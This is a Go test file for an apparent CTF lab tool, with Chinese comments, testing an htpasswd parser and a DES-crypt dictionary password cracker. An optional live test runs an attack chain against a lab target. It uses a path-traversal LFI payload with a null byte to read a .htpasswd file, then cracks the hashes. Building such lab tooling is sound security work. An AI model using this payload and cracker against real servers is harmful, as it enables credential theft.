package ctfplatform

import (
	"context"
	"os"
	"regexp"
	"strings"
	"testing"
	"time"
)

func TestParseHtpasswd(t *testing.T) {
	text := `# comment
alice:8RkVRDjjkJhq6
bob:$apr1$abcdefgh$0123456789abcdef
carol:xHaymgB2KxbJU
malformed-line-without-colon
`
	got := ParseHtpasswd(text)
	if len(got) != 2 {
		t.Fatalf("应只保留 2 条 DES-crypt 记录，实际 %d: %+v", len(got), got)
	}
	if got[0].User != "alice" || got[0].Hash != "8RkVRDjjkJhq6" {
		t.Errorf("解析结果异常: %+v", got[0])
	}
	if got[1].User != "carol" {
		t.Errorf("第二条异常: %+v", got[1])
	}
}

func TestCrackHtpasswd_Hits(t *testing.T) {
	hash := desCrypt("lampsec", "aa")
	entries := []HtpasswdEntry{{User: "alice", Hash: hash}}
	words := append([]string{"wrong1", "wrong2"}, BuiltinWordlist([]string{"alice"})...)

	got := CrackHtpasswd(entries, words, 4)
	if len(got) != 1 {
		t.Fatalf("应破解出 1 条，实际 %d", len(got))
	}
	if got[0].Password != "lampsec" {
		t.Errorf("口令错误: %q（期望 lampsec）", got[0].Password)
	}
	if got[0].Hash != hash || got[0].User != "alice" {
		t.Errorf("结果字段异常: %+v", got[0])
	}
}

func TestCrackHtpasswd_Miss(t *testing.T) {
	hash := desCrypt("Zz9-not-in-any-list-!x", "bb")
	entries := []HtpasswdEntry{{User: "bob", Hash: hash}}
	if got := CrackHtpasswd(entries, BuiltinWordlist(nil), 4); len(got) != 0 {
		t.Fatalf("不应破解出结果，实际 %+v", got)
	}
}

func TestCrackHtpasswd_SaltIsRespected(t *testing.T) {
	// 同一口令、不同盐 → 哈希不同，必须都能被正确破解
	words := []string{"lampsec"}
	e1 := HtpasswdEntry{User: "u1", Hash: desCrypt("lampsec", "aa")}
	e2 := HtpasswdEntry{User: "u2", Hash: desCrypt("lampsec", "zz")}
	got := CrackHtpasswd([]HtpasswdEntry{e1, e2}, words, 2)
	if len(got) != 2 {
		t.Fatalf("两条不同盐的记录都应破解成功，实际 %d", len(got))
	}
	for _, c := range got {
		if c.Password != "lampsec" {
			t.Errorf("口令错误: %+v", c)
		}
	}
}

// TestLiveCrackHtpasswd 对真实靶场跑完整链路：LFI 取 .htpasswd → 解析 → 破解。
// 默认 SKIP（未设 CTF4_LAB_URL）。
func TestLiveCrackHtpasswd(t *testing.T) {
	base := os.Getenv("CTF4_LAB_URL")
	if base == "" {
		t.Skip("未设 CTF4_LAB_URL，跳过真实靶场用例")
	}
	ctx, cancel := context.WithTimeout(context.Background(), 180*time.Second)
	defer cancel()

	cl := webClient(8 * time.Second)
	code, body, _, err := webFetch(ctx, cl, strings.TrimSuffix(base, "/")+"/?page=../restricted/.htpasswd%00")
	if err != nil || code <= 0 {
		t.Fatalf("读取 .htpasswd 失败: code=%d err=%v", code, err)
	}

	reLine := regexp.MustCompile(`(?m)^[A-Za-z0-9_.\-]{1,32}:[A-Za-z0-9./]{13}$`)
	entries := ParseHtpasswd(strings.Join(reLine.FindAllString(string(body), 50), "\n"))
	if len(entries) == 0 {
		t.Fatalf("未从响应中解析出 DES-crypt 条目（响应 %d 字节）", len(body))
	}
	t.Logf("解析到 %d 条记录: %v", len(entries), func() []string {
		var us []string
		for _, e := range entries {
			us = append(us, e.User)
		}
		return us
	}())

	users := make([]string, 0, len(entries))
	for _, e := range entries {
		users = append(users, e.User)
	}
	start := time.Now()
	cracked := CrackHtpasswd(entries, BuiltinWordlist(users), 0)
	t.Logf("[crack] elapsed=%v 破解成功=%d/%d", time.Since(start).Round(time.Millisecond), len(cracked), len(entries))
	for _, c := range cracked {
		// 口令属敏感信息：日志只留用户名与尝试次数，不打印明文
		t.Logf("  %s: 已破解（尝试 %d 次，明文不落日志）", c.User, c.Tries)
	}
	// 不强断言必须破解成功——内置字典覆盖有限，破解失败是正常结果，不是缺陷。
}
